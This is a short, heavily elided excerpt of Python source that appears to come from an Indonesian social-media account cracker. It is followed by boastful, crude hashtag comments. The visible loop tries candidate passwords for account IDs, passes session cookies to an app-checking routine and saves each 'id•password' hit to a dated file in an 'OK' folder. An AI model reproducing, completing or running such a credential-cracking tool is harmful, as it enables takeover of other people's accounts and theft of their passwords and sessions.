        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,H,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
...
#Be_Yourself_And_Never_Surentod_Entod_Terkentod_Kentoddd
#Panglima_Bacot_Brotherhood
#Lu_Ngapain_Sih_Bangsad? Ubah_Dikit_Auto_Eror
